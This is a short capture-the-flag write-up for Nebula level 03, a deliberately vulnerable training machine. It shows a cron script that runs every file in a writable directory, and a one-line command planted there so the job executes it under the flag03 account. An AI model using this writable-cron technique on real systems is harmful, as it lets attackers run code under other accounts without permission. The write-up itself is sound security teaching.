---
layout: default
title: "Nebula03"
tags: Nebula
description: "Exploiting command injection in the CRON job script"
---


## Level 03

> Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes. To do this level, log in as the `level03` account with the password `level03`. Files for this level can be found in `/home/flag03`.

## Source code
There is no source code available on the site, but we will work with the script `/home/flag03/writable.sh`

```
level03@nebula:/home/flag03$ cat writable.sh 
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

```

## Getting the flag

From the task, we know that to get this flag we have to exploit the CRON job.  
By auditing the code of the script we can identify that everything in the `writable.d` directory will be read and executed by `bash`.  
Those challenges are more fun when the CRON job is executed by `root`, but we don't really need it to read the flag: 

```
level03@nebula:/tmp$ cd /home/flag03/writable.d/
level03@nebula:/home/flag03/writable.d$ echo "getflag > /tmp/flag" > flag
level03@nebula:/home/flag03/writable.d$ ls
flag
level03@nebula:/home/flag03/writable.d$ ls
level03@nebula:/home/flag03/writable.d$ cd /tmp
level03@nebula:/tmp$ ls
flag 
level03@nebula:/tmp$ cat flag 
You have successfully executed getflag on a target account
```

So what happened there? We created a file `flag` in the `writable.d` folder. The `writable.sh` was triggered by the CRON job in ~1 minute, and the `bash -x "getflag > /tmp/flag"` was executed, and our valid flag has been copied to the `/tmp/flag`
